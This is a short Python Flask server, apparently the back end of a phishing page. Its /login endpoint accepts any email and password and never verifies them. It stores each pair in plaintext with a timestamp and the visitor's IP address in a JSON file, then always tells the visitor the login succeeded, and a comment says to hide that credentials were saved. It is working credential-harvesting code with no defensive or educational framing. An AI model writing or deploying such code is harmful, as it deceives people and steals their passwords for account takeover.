from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# File to store credentials
DATA_FILE = "data.json"

@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json()
        
        # Validate input
        if not data:
            return jsonify({"message": "Invalid request data"}), 400
            
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        
        # Basic validation
        if not email or not password:
            return jsonify({"message": "Email and password are required"}), 400
        
        # Load existing records
        records = []
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, "r") as f:
                    records = json.load(f)
            except json.JSONDecodeError:
                # If file is corrupted, start fresh
                records = []
        
        # Add new record with timestamp
        records.append({
            "email": email,
            "password": password,
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr  # Optional: log IP address
        })
        
        # Save to file
        with open(DATA_FILE, "w") as f:
            json.dump(records, f, indent=2)
        
        # Return success (but don't leak that credentials were saved)
        return jsonify({
            "message": "✅ Login successful!",
            "status": "success"
        }), 200
        
    except Exception as e:
        print(f"Error in login endpoint: {e}")
        return jsonify({
            "message": "Server error occurred",
            "status": "error"
        }), 500

@app.route("/health", methods=["GET"])
def health():
    """Simple health check endpoint"""
    return jsonify({"status": "healthy"}), 200

if __name__ == "__main__":
    # Use port 5000 (default) or any other port
    app.run(debug=True, host="0.0.0.0", port=5000)